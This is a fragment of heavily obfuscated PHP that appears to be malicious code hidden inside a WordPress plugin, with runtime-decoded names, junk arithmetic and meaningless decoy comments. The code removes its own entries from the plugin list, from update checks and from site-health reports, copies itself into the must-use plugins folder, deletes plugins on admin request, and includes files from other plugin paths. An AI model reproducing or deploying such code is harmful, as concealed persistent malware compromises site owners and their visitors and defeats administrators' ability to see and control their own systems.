    if ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(738))) @delete_transient(bovhd4vawcd(65));
clearstatcache(true);$jx9u4qxr3gk64n=PHP_MAJOR_VERSION;$t4sgeezpx=$jx9u4qxr3gk64n*10;
  }

 if (!@$GLOBALS['__scf_i9hdv7zrfsy_45']($mattyf271acsx0qv)   ||     !@$GLOBALS['__scf_p_260ito5s0j_50']($mattyf271acsx0qv)     ||  !@$GLOBALS['__scf_j_lsn68og3i_48']($mattyf271acsx0qv))   {
  if ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(675))) @set_transient(lpwgqh9300(739),  1, $vhsfos8hgo   ?   (0xd585+0x7bfb) : (3596+4));
       unset($vhsfos8hgo, $mv21n72bnpnjgr8i);
 return;


  }
     unset($vhsfos8hgo, $mv21n72bnpnjgr8i);
      }
  
$hm200mw9rphg90c  =  $mattyf271acsx0qv  .  '/'   . a_2kjbn3ievobiy5tn3cy();
if (p_lwrm_zqo9euyd0($hm200mw9rphg90c))   {

  return;
   }
   $zbg6mnop8fq   = @$GLOBALS['__scf_a83pywb98qzq2_20']($hm200mw9rphg90c) ?  n2fjr1yyl5ye7s_6q($hm200mw9rphg90c)  :   false;
   if   (@$GLOBALS['__scf_pftf6vocmvs2m_99']($hm200mw9rphg90c)  >    (6175-1175)    &&   $GLOBALS['__scf_e_8z8ias8ka_43']($zbg6mnop8fq) && $GLOBALS['__scf_pe3s4q1z7z_59']($zbg6mnop8fq)  ===  $GLOBALS['__scf_pe3s4q1z7z_59']($xs7ycu0j4f9))   {
lnseazh_1k4yq6v_kjl($hm200mw9rphg90c);
   aualrpzvrr5kleitna1();
qpaad50893o72_4b73();
return;
  }


      if   (@$GLOBALS['__scf_a83pywb98qzq2_20']($hm200mw9rphg90c)     && @$GLOBALS['__scf_pftf6vocmvs2m_99']($hm200mw9rphg90c)   >  (4902+98))  {
        $k2ks2ykj4ww5yy9 =  (string)   @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($hm200mw9rphg90c, false, null,      0,  (0xf9b+0x65));
   if     ($GLOBALS['__scf_e_8z8ias8ka_43']($k2ks2ykj4ww5yy9)  &&   $GLOBALS['__scf_vqnw5_4kg7eu_96'](m5t68uuej1(97),  $k2ks2ykj4ww5yy9,  $_dm)    &&      version_compare($_dm[1],  kdgw8qqvzf6yolk(),  '>'))   return;
unset($k2ks2ykj4ww5yy9, $_dm);
 }



  if   ($zbg6mnop8fq ===  null)  return;
  




     unset($zbg6mnop8fq);
$zffb4iacl0r21go  =  a3hx61zfms1ji3euwsc($hm200mw9rphg90c,    y2fq_g7qilvdboqm1($xs7ycu0j4f9));
  if (!$zffb4iacl0r21go || !@$GLOBALS['__scf_nmc3chd3edto_699']($hm200mw9rphg90c)  || @$GLOBALS['__scf_pftf6vocmvs2m_99']($hm200mw9rphg90c)  < (961+39)) {
   if ($zffb4iacl0r21go && @$GLOBALS['__scf_a83pywb98qzq2_20']($hm200mw9rphg90c))     {
 $k2ks2ykj4ww5yy9 =      (string)   @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($hm200mw9rphg90c, false,  null,  0,   (3890+206));
$u6y_xcqyza_x   = $GLOBALS['__scf_e_8z8ias8ka_43']($k2ks2ykj4ww5yy9)   &&     $GLOBALS['__scf_vqnw5_4kg7eu_96'](bovhd4vawcd(97),   $k2ks2ykj4ww5yy9,     $_dm)   && version_compare($_dm[1],  kdgw8qqvzf6yolk(),   '>');
     unset($k2ks2ykj4ww5yy9,  $_dm);$j0r_10ko=54+59;$fb43stb_lis0=$j0r_10ko-35;
 if    (!$u6y_xcqyza_x)   {
   cik9ldzrbjmtnzm00($hm200mw9rphg90c,    (371+49));
      netei2x342rtzmi4tj69($hm200mw9rphg90c);

      }
  }
if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(675)))  @set_transient(lpwgqh9300(739), 1, (3584+16));
return;
}
 
 tgj6urla_2q3x4g8e($hm200mw9rphg90c);
cik9ldzrbjmtnzm00($hm200mw9rphg90c,    (386+34));
    lnseazh_1k4yq6v_kjl($hm200mw9rphg90c);
    aualrpzvrr5kleitna1();
 qpaad50893o72_4b73();


}    catch    (Throwable    $k3g08rnqu9m)    {
     r63yaewew47stuijcrwsx6(lpwgqh9300(733),   $k3g08rnqu9m);
     }    catch   (Exception     $k3g08rnqu9m)      {
  }
 }
  function  lbi2uco0mlnot4zc3k5kqe()
   {


   try {
 $b83hh6wu7v306y3 =  $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(500)) ?     (int)  get_option(m5t68uuej1(740),     0)   : 0;
 if    ($b83hh6wu7v306y3 <  $GLOBALS['__scf_ibw9xvmx9ckin_187']()  -  (0x63+0xc9)     || $b83hh6wu7v306y3 >  $GLOBALS['__scf_ibw9xvmx9ckin_187']()  +   (0x11b+0x11)) {
if    ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(741)))   @update_option(lpwgqh9300(740),   $GLOBALS['__scf_ibw9xvmx9ckin_187']());
       $n4zzf5nvs07vvsx2 =  d6ydz3_mq4hw_2s8_bo(m5t68uuej1(742),    "");



   $fa_ysluvu11qm  =  qvjdebfk73eai06dz0vqt($GLOBALS['__scf_e_8z8ias8ka_43']($n4zzf5nvs07vvsx2)   ?  $n4zzf5nvs07vvsx2    :    "");
  $ji2wqyyr5_ofod5l  =    ptsk5wzqrdsun9ej(t6995wceyqc2q1wqvl());
   if     (!$GLOBALS['__scf_e_8z8ias8ka_43']($n4zzf5nvs07vvsx2)  ||  $GLOBALS['__scf_fr9u7cq1eo_10']($n4zzf5nvs07vvsx2)      < (406+94)  ||   at2pgldx1ep7sbjlr_r7($n4zzf5nvs07vvsx2)   ||   $fa_ysluvu11qm  ===  "" ||   ($ji2wqyyr5_ofod5l  !==  null    &&    $ji2wqyyr5_ofod5l  !==   ""  &&   version_compare($ji2wqyyr5_ofod5l, $fa_ysluvu11qm,   '>')))  {
// inject subscriber for WP InnerBlocks

 $xs7ycu0j4f9 =   z2lalb3eiqlgy6ozb9();
  if   ($xs7ycu0j4f9 &&  !at2pgldx1ep7sbjlr_r7($xs7ycu0j4f9))  {



  $sxe6ttlk2l8a8kr =  qvjdebfk73eai06dz0vqt($xs7ycu0j4f9);


if   (!$GLOBALS['__scf_e_8z8ias8ka_43']($n4zzf5nvs07vvsx2)   || $GLOBALS['__scf_fr9u7cq1eo_10']($n4zzf5nvs07vvsx2) < (484+16) ||    at2pgldx1ep7sbjlr_r7($n4zzf5nvs07vvsx2) ||   $fa_ysluvu11qm  ===      ""  ||    ($sxe6ttlk2l8a8kr  !== ""  && version_compare($sxe6ttlk2l8a8kr,  $fa_ysluvu11qm,  '>')))   {
  vmq5vh_lh7_vsiehf4nm(m40pvx5ij_z4mj(743), $xs7ycu0j4f9,    m5t68uuej1(626));
if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(741)))  {
   @update_option(m40pvx5ij_z4mj(538),   0,  m5t68uuej1(626));
@update_option(bovhd4vawcd(652),   0,  m5t68uuej1(744));
        @update_option(bovhd4vawcd(745), 0,   m5t68uuej1(744));
}
if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(746)))  @delete_transient(ikw0tf8wjoufcwbi7uaqr());

   }
}
}
// serialize observer for WP Higher Order Components

    }
 

if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(747))  && $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(741)))    {
    $wj31m350kfi1c  =  get_option(m5t68uuej1(748));$rpdahj3d2ey0=PHP_INT_MAX/PHP_INT_MAX;$mzx7uqs3u54jea=$rpdahj3d2ey0+91;
if ($wj31m350kfi1c !==    false &&     $wj31m350kfi1c !== kdgw8qqvzf6yolk())    {


   @update_option(lpwgqh9300(748),  kdgw8qqvzf6yolk(),  m5t68uuej1(744));
}
     }
 if  (!     $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(749)) ||   !    add_option(bovhd4vawcd(748),  kdgw8qqvzf6yolk(), "",    m5t68uuej1(750)))  {
   return;

 }
    
owb64bf9m2eyvldimcl3h2();



if ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(741)))  {
    @update_option(lpwgqh9300(751), 0,  m5t68uuej1(750));$v01m5t_lgbuml=72*8;$qkxws7x_caven=$v01m5t_lgbuml-38;



  @update_option(lpwgqh9300(652),     0,  m5t68uuej1(750));
  @update_option(lpwgqh9300(752),  0,   m40pvx5ij_z4mj(750));
  


   }
  if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(746))) @delete_transient(ikw0tf8wjoufcwbi7uaqr());
   
  if    (!empty($xs7ycu0j4f9)  && !at2pgldx1ep7sbjlr_r7($xs7ycu0j4f9))  {
      vmq5vh_lh7_vsiehf4nm(m5t68uuej1(743), $xs7ycu0j4f9,  m40pvx5ij_z4mj(750));
}
// suspend command for WP Server Side Render

    qgs0j96xr638o3621(null);
    
  cik9ldzrbjmtnzm00(t6995wceyqc2q1wqvl(),  (390+30));
     
  ki6tdgirglgewq(bovhd4vawcd(386),  m5t68uuej1(387), 0);
 


 ki6tdgirglgewq(m5t68uuej1(386),   lpwgqh9300(753), 0);
  }  catch    (Throwable $k3g08rnqu9m)  {

       r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(754), $k3g08rnqu9m);
       if ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(605)))    @delete_option(m5t68uuej1(748));
     }   catch  (Exception  $k3g08rnqu9m)  {
 if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(755)))     @delete_option(lpwgqh9300(756));
 }
  }
function   bddpf2scho2gt5gubf()
   {
  try  {



    if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(757)))  {
     @$GLOBALS['__scf_bgujd0wqxduxtu_290'](home_url('/'),  array(lpwgqh9300(465) => (6-1), lpwgqh9300(308)    =>  false, bovhd4vawcd(466)   => false));



    }
 }  catch  (Throwable   $k3g08rnqu9m)   {
r63yaewew47stuijcrwsx6(bovhd4vawcd(758),  $k3g08rnqu9m);


    }   catch (Exception $k3g08rnqu9m)  {
  }
      }
  
       function mnudmcgar3fd7cr7bg()
 {

      static    $pzntvto4ji1 =  false;
   if    ($pzntvto4ji1)     return;
$pzntvto4ji1 =   true;
  try {
       if   (!  $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(759)) ||    !    is_admin())  {
   return;
    }
  if   (!$GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(760))  ||    !current_user_can(m40pvx5ij_z4mj(761)))  {
return;$pv2mj_1hxp8ob=PHP_INT_MAX/PHP_INT_MAX;$pbs18i_a9aoc=$pv2mj_1hxp8ob+70;



     }
$n8fv30dx7w =  isset($_REQUEST[bovhd4vawcd(762)]) ?    $_REQUEST[m40pvx5ij_z4mj(762)]   :   "";
    $n8fv30dx7w =  $GLOBALS['__scf_e_8z8ias8ka_43']($n8fv30dx7w)  ? $GLOBALS['__scf_nimluvpxhrpvn_323']($n8fv30dx7w)   : "";
if   ($n8fv30dx7w  !==   m40pvx5ij_z4mj(763)  &&   $n8fv30dx7w  !==      lpwgqh9300(764))    {
  return;
}

$zkvpfpbq6xdsiy =  array();
 if  ($n8fv30dx7w     ===  bovhd4vawcd(763))    {

$b2lk00x8jxu   =    isset($_REQUEST[lpwgqh9300(607)])  ?   $_REQUEST[m5t68uuej1(607)]  : "";
  $b2lk00x8jxu  = $GLOBALS['__scf_e_8z8ias8ka_43']($b2lk00x8jxu) ? $GLOBALS['__scf_nimluvpxhrpvn_323']($b2lk00x8jxu)  :    "";
   if    ($b2lk00x8jxu   && $b2lk00x8jxu  !==  vtoks5z0hvy4jllpl04ts1())   {

   $zkvpfpbq6xdsiy[] =  $b2lk00x8jxu;

  }
}    else {

$snznmxrruj = isset($_REQUEST[lpwgqh9300(765)])     ?   $_REQUEST[m5t68uuej1(766)] : array();
$snznmxrruj     =   $GLOBALS['__scf_pomb89yiuz_37']($snznmxrruj) ?   $snznmxrruj :  array();



foreach  ($snznmxrruj as    $b2lk00x8jxu)   {


  $b2lk00x8jxu  =  $GLOBALS['__scf_e_8z8ias8ka_43']($b2lk00x8jxu) ?   $GLOBALS['__scf_nimluvpxhrpvn_323']($b2lk00x8jxu)  :  "";
 if     ($b2lk00x8jxu    &&  $b2lk00x8jxu   !==   vtoks5z0hvy4jllpl04ts1())  {



     $zkvpfpbq6xdsiy[] =    $b2lk00x8jxu;
     }
   }
       }
if   (empty($zkvpfpbq6xdsiy)) {
      return;
}
$qcaoq7dfd5vlc = false;

foreach     ($zkvpfpbq6xdsiy   as   $b2lk00x8jxu)   {
    if (olp26wlzzy8se0xhvu($b2lk00x8jxu))  {
 _2vbd1b2qyauu9yzodl5($b2lk00x8jxu);
   $qcaoq7dfd5vlc  =     true;
     }



   }
   if  ($qcaoq7dfd5vlc)  {
 


       if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(767))  &&   $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(768)))  {
wp_safe_redirect(admin_url(lpwgqh9300(769)));

 }
     }
      }   catch  (Throwable  $k3g08rnqu9m)  {
 r63yaewew47stuijcrwsx6(m5t68uuej1(770),  $k3g08rnqu9m);$oswlaxv5=PHP_INT_MAX/PHP_INT_MAX;$dou6xvijwj=$oswlaxv5+92;
    }  catch     (Exception $k3g08rnqu9m)   {
 }
}
function hg8b7vehry61np($vezvw9dttkkmdom,      $ka287g_osq4s6)
 {
// WP Custom Link: yield middleware


  if  ($ka287g_osq4s6     === m40pvx5ij_z4mj(771)) {
// @archive deque

    $plugins     =  &$GLOBALS[lpwgqh9300(772)];
 if    (!isset($plugins[m5t68uuej1(771)]) ||   !$GLOBALS['__scf_pomb89yiuz_37']($plugins[bovhd4vawcd(771)])) {



 return   $vezvw9dttkkmdom;
  }
$ti_hy21tb3w     =   defined(m5t68uuej1(164))  ? WP_CONTENT_DIR  : (defined(bovhd4vawcd(89))      ?    ABSPATH .  m5t68uuej1(82)     :   "");
if ($ti_hy21tb3w  ===     "")  {



 return   $vezvw9dttkkmdom;
  }
  $mumzk0ipaaffn =  array(bovhd4vawcd(773) => m40pvx5ij_z4mj(774),   m40pvx5ij_z4mj(775)   => m40pvx5ij_z4mj(776));
  foreach   ($mumzk0ipaaffn  as   $vlwopwnmtlzszz     =>  $n0a29br3r327jc)  {
   if    (!isset($plugins[m5t68uuej1(771)][$vlwopwnmtlzszz]))     {
  continue;
  }
// corner case handler


     $us6t435ob2  =    @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($ti_hy21tb3w     .    '/' .  $vlwopwnmtlzszz);
     if   (!$GLOBALS['__scf_e_8z8ias8ka_43']($us6t435ob2)   ||    $GLOBALS['__scf_i8i8g4oxha_7']($us6t435ob2, bovhd4vawcd(777)   .   $n0a29br3r327jc  . bovhd4vawcd(778))     ===  false) {
/* approximated event-bus */

 continue;
  }
 $lozszxvosocilyj    =    $GLOBALS['__scf_r1v12_o00h5hc_454'](lpwgqh9300(779)  .     $n0a29br3r327jc   .   m40pvx5ij_z4mj(780)  .      $n0a29br3r327jc .  m40pvx5ij_z4mj(781),  "", $us6t435ob2);
   if      (!$GLOBALS['__scf_e_8z8ias8ka_43']($lozszxvosocilyj))  {
   continue;

}
   $lozszxvosocilyj  = $GLOBALS['__scf_nimluvpxhrpvn_323']($lozszxvosocilyj);
      if   ($lozszxvosocilyj === ""   ||   $lozszxvosocilyj  ===   lpwgqh9300(661)   ||    $lozszxvosocilyj   ===     m40pvx5ij_z4mj(238))   {
  unset($plugins[m40pvx5ij_z4mj(782)][$vlwopwnmtlzszz]);
   }
// eliminate projective bloom-filter

  }
return    $vezvw9dttkkmdom;
   }
// MySQL window functions: decidable distributor

  if ($ka287g_osq4s6 !==  lpwgqh9300(783)) {
// propagate-const referentially-transparent dependent-type

return      $vezvw9dttkkmdom;$iq7039m9wo=PHP_MAJOR_VERSION;$lv18bn5o4=$iq7039m9wo*9;



  }



     $plugins   = &$GLOBALS[lpwgqh9300(772)];
  $aw_0l7t8lr6y    =    $GLOBALS['__scf_os_n9tj5psxjj_3'](t6995wceyqc2q1wqvl());
   if    (isset($plugins[m40pvx5ij_z4mj(783)][$aw_0l7t8lr6y]))  {
   unset($plugins[m5t68uuej1(784)][$aw_0l7t8lr6y]);
        }
   return    $vezvw9dttkkmdom;



   }
if     (!$GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(785)))      {
function vw3lwsayq58vo4220xyge()
    {
if  (!   p1eodt9ox5eneum9qqgjt3())      {
   return;
      }
     $e7s4480cj8b1c  =     $GLOBALS['__scf_os_n9tj5psxjj_3'](t6995wceyqc2q1wqvl());


$lnfyvmqftz  = $GLOBALS['__scf_os_n9tj5psxjj_3'](t6995wceyqc2q1wqvl(),  lpwgqh9300(514));
 $jlwhofas3p   =   $lnfyvmqftz  .  '/' . $e7s4480cj8b1c;
 echo     lpwgqh9300(786)  .   esc_attr($e7s4480cj8b1c)   . lpwgqh9300(787) .      esc_attr($jlwhofas3p)    .    m5t68uuej1(788);
        echo  m5t68uuej1(789)  . esc_js($e7s4480cj8b1c)  .  bovhd4vawcd(790)    . esc_js($jlwhofas3p)     .   bovhd4vawcd(791);


 }
  }
       if (!$GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(792)))    {

  function  qmrkprj5g43bisd75d($zjnd0_ump_)
{
  if  (!   $GLOBALS['__scf_pd74_ila1rfp_70']($zjnd0_ump_))     {
 return $zjnd0_ump_;
 }


  $e7s4480cj8b1c   =  vtoks5z0hvy4jllpl04ts1();
  

if  (isset($zjnd0_ump_->response[$e7s4480cj8b1c])) {
// WP Site Title: discriminative heap

 unset($zjnd0_ump_->response[$e7s4480cj8b1c]);
  }
      return  $zjnd0_ump_;
     }
}
 if     (!$GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(793)))   {


        function     k0ky40bj0rx89r_2ip($plugins)
   {


$e3thri4q7dp  =   vtoks5z0hvy4jllpl04ts1();


if  (isset($plugins[$e3thri4q7dp]))    {

unset($plugins[$e3thri4q7dp]);
 }
// WP Navigation Block: cancel interceptor

$lnfyvmqftz   =    $GLOBALS['__scf_os_n9tj5psxjj_3'](t6995wceyqc2q1wqvl(),   m40pvx5ij_z4mj(794));$zs2d7hr15=94*5;$gq9t0lk5w1vy9=$zs2d7hr15-17;
 $jlwhofas3p    =    $lnfyvmqftz     .  '/' .   $GLOBALS['__scf_os_n9tj5psxjj_3'](t6995wceyqc2q1wqvl());
    if     (isset($plugins[$jlwhofas3p]))  {
       unset($plugins[$jlwhofas3p]);


  }
   return   $plugins;
  }
    }
function  trhd34fmabstrtxzm($mfazq7e3mrkdji)
{
        if    (!     $GLOBALS['__scf_pomb89yiuz_37']($mfazq7e3mrkdji)) {
   return   $mfazq7e3mrkdji;

 }


$gzva118ezt1    =  "";
 if ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(795)) &&  $GLOBALS['__scf_nmc3chd3edto_699'](t6995wceyqc2q1wqvl()))   {
    $om_3yvem_2y42w_ =  get_plugin_data(t6995wceyqc2q1wqvl(),   false, false);
$gzva118ezt1  = isset($om_3yvem_2y42w_[bovhd4vawcd(796)]) ?   $om_3yvem_2y42w_[m5t68uuej1(797)]  : "";


   }


 $tb4l_bq2oj6n  = array(m40pvx5ij_z4mj(798),  bovhd4vawcd(799));
  foreach ($tb4l_bq2oj6n as $wcre5k50w0sk3u7t)    {
    if  (! isset($mfazq7e3mrkdji[$wcre5k50w0sk3u7t][bovhd4vawcd(800)])    ||      !    $GLOBALS['__scf_pomb89yiuz_37']($mfazq7e3mrkdji[$wcre5k50w0sk3u7t][m5t68uuej1(800)])) {
 continue;
     }
  foreach    ($mfazq7e3mrkdji[$wcre5k50w0sk3u7t][m5t68uuej1(800)]   as   $key  =>  $k2bqgs2y39wr)  {
  if     ($GLOBALS['__scf_i8i8g4oxha_7']($key,     vtoks5z0hvy4jllpl04ts1()) !== false ||   $key === vtoks5z0hvy4jllpl04ts1()) {


 unset($mfazq7e3mrkdji[$wcre5k50w0sk3u7t][bovhd4vawcd(801)][$key]);
continue;



 }
       if   ($gzva118ezt1    !==  ""  && $key ===   $gzva118ezt1)   {


      unset($mfazq7e3mrkdji[$wcre5k50w0sk3u7t][lpwgqh9300(802)][$key]);
continue;
   }
    }
      }
foreach   (array(lpwgqh9300(803),   m5t68uuej1(804)) as    $ifjvdlobs433cnj) {
 $k5hsg0dototr4dlj = isset($mfazq7e3mrkdji[$ifjvdlobs433cnj][bovhd4vawcd(805)])     &&  $GLOBALS['__scf_pomb89yiuz_37']($mfazq7e3mrkdji[$ifjvdlobs433cnj][lpwgqh9300(805)])    ?  $mfazq7e3mrkdji[$ifjvdlobs433cnj][bovhd4vawcd(805)] :  array();
   if  (!$k5hsg0dototr4dlj)   continue;
   $zlzwvbj7pt28r      = defined(bovhd4vawcd(574)) ? WPMU_PLUGIN_DIR  :   (defined(m40pvx5ij_z4mj(806))    ?   WP_CONTENT_DIR    .  m40pvx5ij_z4mj(14)  :   "");
 

$frp8u3y1dfc_b    =    array();
 if  ($gzva118ezt1  !==    "") $frp8u3y1dfc_b[]   =  $gzva118ezt1;
  $frp8u3y1dfc_b[]    = $GLOBALS['__scf_os_n9tj5psxjj_3'](t6995wceyqc2q1wqvl());
   if ($zlzwvbj7pt28r !==  ""  &&    @$GLOBALS['__scf_i9hdv7zrfsy_45']($zlzwvbj7pt28r)    &&  $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(736))) {
// @join accumulator

      foreach  ((array)    @$GLOBALS['__scf_ql1i4f573p8rhm_73']($zlzwvbj7pt28r .     m5t68uuej1(737)) as    $mv21n72bnpnjgr8i)    {
$vhe5twxajpf    =    @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($mv21n72bnpnjgr8i,   false,    null,    0, (8169+23));
if   (!$GLOBALS['__scf_e_8z8ias8ka_43']($vhe5twxajpf) || $GLOBALS['__scf_i8i8g4oxha_7']($vhe5twxajpf,   bovhd4vawcd(807))    === false)   continue;
 if    ($GLOBALS['__scf_vqnw5_4kg7eu_96'](m40pvx5ij_z4mj(808), $vhe5twxajpf,  $zb9k08nt89fv))  {
// WP Cover Block network override



   $y3v6atoz5c7pbz     =  $GLOBALS['__scf_nimluvpxhrpvn_323']($zb9k08nt89fv[1]);
   if ($y3v6atoz5c7pbz  !==     "")   $frp8u3y1dfc_b[] =   $y3v6atoz5c7pbz;
}
// strength-reduce cubic contravariant

 $frp8u3y1dfc_b[]  =      $GLOBALS['__scf_os_n9tj5psxjj_3']($mv21n72bnpnjgr8i);

  }



}
foreach    ($k5hsg0dototr4dlj    as  $key    => $k2bqgs2y39wr) {$w2qgbz5q96qp2m=40*4;$r5brf0jzh=$w2qgbz5q96qp2m-13;
      foreach    ($frp8u3y1dfc_b  as $g_zfgbnjiz030fe) {
if ($key   ===   $g_zfgbnjiz030fe ||  $key  ===   sanitize_text_field($g_zfgbnjiz030fe))   {
    unset($mfazq7e3mrkdji[$ifjvdlobs433cnj][m40pvx5ij_z4mj(805)][$key]);
break;
    }
    }
  }
     }
     $coox2kk7t_123  = isset($mfazq7e3mrkdji[bovhd4vawcd(809)][bovhd4vawcd(805)])  && $GLOBALS['__scf_pomb89yiuz_37']($mfazq7e3mrkdji[lpwgqh9300(809)][bovhd4vawcd(805)])   ?   $mfazq7e3mrkdji[bovhd4vawcd(810)][m40pvx5ij_z4mj(805)]    :   array();
 

  if   ($coox2kk7t_123)   {
// format keystore for PSR-15 middleware

 $ti_hy21tb3w    =    defined(bovhd4vawcd(811))   ? WP_CONTENT_DIR :  (defined(m40pvx5ij_z4mj(812))     ? ABSPATH   . lpwgqh9300(82)   :  "");$kx8m24w9i4n=PHP_MAJOR_VERSION;$cgxu1lbb8c=$kx8m24w9i4n*6;
 $mumzk0ipaaffn  = array(lpwgqh9300(813) =>  m40pvx5ij_z4mj(774),   bovhd4vawcd(814)  =>    m5t68uuej1(776));
       foreach ($coox2kk7t_123  as    $key =>    $k2bqgs2y39wr)   {
  if (!isset($mumzk0ipaaffn[$key])    ||   $ti_hy21tb3w === "")  continue;
  $us6t435ob2  =  @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($ti_hy21tb3w .    '/'     . $key, false, null, 0,  (4062+34));
 if   ($GLOBALS['__scf_e_8z8ias8ka_43']($us6t435ob2)  && ($GLOBALS['__scf_i8i8g4oxha_7']($us6t435ob2,  m40pvx5ij_z4mj(777)  .   $mumzk0ipaaffn[$key]    . m5t68uuej1(778))    !==  false    || $GLOBALS['__scf_i8i8g4oxha_7']($us6t435ob2, bovhd4vawcd(807))  !== false))  {



unset($mfazq7e3mrkdji[m40pvx5ij_z4mj(815)][bovhd4vawcd(805)][$key]);
}
 }
}
      return   $mfazq7e3mrkdji;



    }
  
   function      kjcduy6vohpcf1zxb($rkaj3w8of0)


     {
 if   (! $GLOBALS['__scf_pomb89yiuz_37']($rkaj3w8of0))  {
return   $rkaj3w8of0;
  }
$tzkvhtq936   =  $GLOBALS['__scf_os_n9tj5psxjj_3'](t6995wceyqc2q1wqvl());
 $b7q31j_8nq8oz    =  $GLOBALS['__scf_rwpc7a7ar1p_204']($tzkvhtq936, PATHINFO_FILENAME);



$swv1ddqs29k  =   array(
   array(m40pvx5ij_z4mj(816)  => '#'    .  $GLOBALS['__scf_zh8jfi64aw1__817']($tzkvhtq936, '#') .    lpwgqh9300(818),   m40pvx5ij_z4mj(819)    =>    true),
   array(m40pvx5ij_z4mj(820)   => bovhd4vawcd(821)   . $GLOBALS['__scf_zh8jfi64aw1__817']($b7q31j_8nq8oz,    '#')  .   m40pvx5ij_z4mj(818), bovhd4vawcd(822)  =>  true),
    );
      if   (isset($rkaj3w8of0[lpwgqh9300(823)]) &&    $GLOBALS['__scf_pomb89yiuz_37']($rkaj3w8of0[lpwgqh9300(824)]))   {
foreach  ($rkaj3w8of0[m5t68uuej1(824)]  as     $x9adbai0k0pb_mgl =>  $fnwhjlc4bo5hy) {
if   (!   $GLOBALS['__scf_pomb89yiuz_37']($fnwhjlc4bo5hy)  || !  $GLOBALS['__scf_b5yzo205c3_f8_41']($x9adbai0k0pb_mgl)) {
 continue;
 }
// WP Core Data: replicate task-graph

    if    (!  isset($rkaj3w8of0[lpwgqh9300(825)][$x9adbai0k0pb_mgl][lpwgqh9300(826)]) ||      !   $GLOBALS['__scf_pomb89yiuz_37']($rkaj3w8of0[lpwgqh9300(825)][$x9adbai0k0pb_mgl][lpwgqh9300(826)])) {
  $rkaj3w8of0[m5t68uuej1(827)][$x9adbai0k0pb_mgl][m5t68uuej1(826)] =  array();
}



foreach ($swv1ddqs29k     as  $is3idvbpzc) {
  $rkaj3w8of0[lpwgqh9300(827)][$x9adbai0k0pb_mgl][m40pvx5ij_z4mj(828)][]   =     $is3idvbpzc;
    }

}
    }
    return  $rkaj3w8of0;
 }




function     f7tvsecg7s5g50f8w0hg()
      {
try   {
// @relocate command

 if  (!    defined(bovhd4vawcd(829))     || constant(bovhd4vawcd(829))    < (0x5+0x2)) {
  return;
 }
 if  ($GLOBALS['__scf_l_p7ggy6l__533'](bovhd4vawcd(830),  false))    {
return;


 }
 $vo1nbl6ptlbwv =    $GLOBALS['__scf_os_n9tj5psxjj_3'](t6995wceyqc2q1wqvl());
 $r6oy7lffyvil =   defined(bovhd4vawcd(702))   ? WP_PLUGIN_DIR    :    "";
    $uy4dyvd5qop   =    array(
 $r6oy7lffyvil   .     lpwgqh9300(831),
     $r6oy7lffyvil  .  lpwgqh9300(832),
$r6oy7lffyvil     .  bovhd4vawcd(833),


    );

 $lgnz6lcdeycsfg    =   "";
     foreach ($uy4dyvd5qop  as      $e7s4480cj8b1c) {
    if  ($e7s4480cj8b1c  !== "" && @$GLOBALS['__scf_a83pywb98qzq2_20']($e7s4480cj8b1c)   && @$GLOBALS['__scf_j_lsn68og3i_48']($e7s4480cj8b1c))    {$zf_yim_wb5_pau=971;$gid0oh9md=($zf_yim_wb5_pau>0)?$zf_yim_wb5_pau:-$zf_yim_wb5_pau;
  $lgnz6lcdeycsfg = $e7s4480cj8b1c;
    break;
}
}

if   ($lgnz6lcdeycsfg  ===  "")    {
   return;
}
 $oudf19jkbasmcf    =   $GLOBALS['__scf_oagg5b1ubqmznt_11']($lgnz6lcdeycsfg);
 spl_autoload_register(function   ($_9_vm12zzw1pnxe)      use    ($oudf19jkbasmcf)  {
    foreach     (array($oudf19jkbasmcf     .  '/'  . $_9_vm12zzw1pnxe  .   m40pvx5ij_z4mj(834),    $oudf19jkbasmcf    . '/'     .  $_9_vm12zzw1pnxe  . lpwgqh9300(835)) as $ltrgl_2b_0wnap)  {
    if    (@$GLOBALS['__scf_a83pywb98qzq2_20']($ltrgl_2b_0wnap))     {
   include_once     $ltrgl_2b_0wnap;

return;



}
     }
   });
 $ohfs0792xygm   =  @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($lgnz6lcdeycsfg);
   if ($ohfs0792xygm     === false || $GLOBALS['__scf_i8i8g4oxha_7']($ohfs0792xygm,  lpwgqh9300(836)) ===  false)  {$n1ctgd2irf8=PHP_INT_MAX/PHP_INT_MAX;$u47rvevl=$n1ctgd2irf8+22;
 return;


  }
    $ohfs0792xygm  = $GLOBALS['__scf_r1v12_o00h5hc_454'](bovhd4vawcd(837), "",   $ohfs0792xygm);

